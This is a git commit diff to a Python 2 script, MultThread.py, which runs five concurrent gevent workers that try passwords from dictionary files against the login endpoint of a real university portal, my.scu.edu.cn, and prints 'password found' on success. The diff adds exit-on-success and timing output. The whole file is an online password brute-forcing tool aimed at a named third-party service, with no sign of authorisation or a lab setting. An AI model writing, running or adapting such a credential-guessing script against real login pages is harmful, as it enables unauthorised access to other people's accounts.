5eea9236f06eaf354cd97f50fef6be8c01bcdba7
Max <hktxt2011@gmail.com>
2016-07-05 11:05:49 +0800

    Add files via upload

--- MultThread.py
+++ MultThread.py
@@ -4,15 +4,14 @@ import linecache
 import threading
 import time
 import requests
-requests.adapters.DEFAULT_RETRIES = 5
+#requests.adapters.DEFAULT_RETRIES = 5
 import re
 import gevent
 from gevent import monkey; monkey.patch_socket()
 from bs4 import BeautifulSoup as BS
-from Queue import Queue 
 
 
-def payloads(f,q):
+def payloads(f):
 
 	posturl = 'http://my.scu.edu.cn/userPasswordValidate.portal' 
 	userkey = 'Login.Token1'
@@ -35,33 +34,38 @@ def payloads(f,q):
 		t1 = soup.find(text=result) 
 		if t1:
 			print 'password found:'+passv
-			q.put(passv)
+			#q.put(passv)
 			f.close()
+			print "end at " + time.ctime()
+			exit()
 			break
 		else:
-			print passv + ' is not the password.'
+			print passv + ' is not the password...continue...'
 	f.close()
 
     
 def main():
 
-	q = Queue()
-	result = []
-	f1 = open("F:\dict\dict1.txt")
-	f2 = open("F:\dict\dict2.txt")
-	f3 = open("F:\dict\dict3.txt")
-	f4 = open("F:\dict\dict4.txt")
-	f5 = open("F:\dict\dict5.txt")
+	#q = Queue()
+	#result = []
+	f1 = open("F:\dict1.txt")
+	f2 = open("F:\dict2.txt")
+	f3 = open("F:\dict3.txt")
+	f4 = open("F:\dict4.txt")
+	f5 = open("F:\dict5.txt")
 
 	gevent.joinall([
-        gevent.spawn(payloads, f1, q),
-        gevent.spawn(payloads, f2, q),
-	gevent.spawn(payloads, f3, q),
-        gevent.spawn(payloads, f4, q),
-	gevent.spawn(payloads, f5, q),
+        gevent.spawn(payloads, f1),
+        gevent.spawn(payloads, f2),
+		gevent.spawn(payloads, f3),
+        gevent.spawn(payloads, f4),
+		gevent.spawn(payloads, f5),
 ])
-	result.append(q.get())
-	print result	
+	#result.append(q.get())
+	#print result	
 
 if __name__ == '__main__':
+	print "begin at " + time.ctime()
 	main()
+	print "All finished. No password found, please make a more powerful dic. "
+	print "end at " + time.ctime()
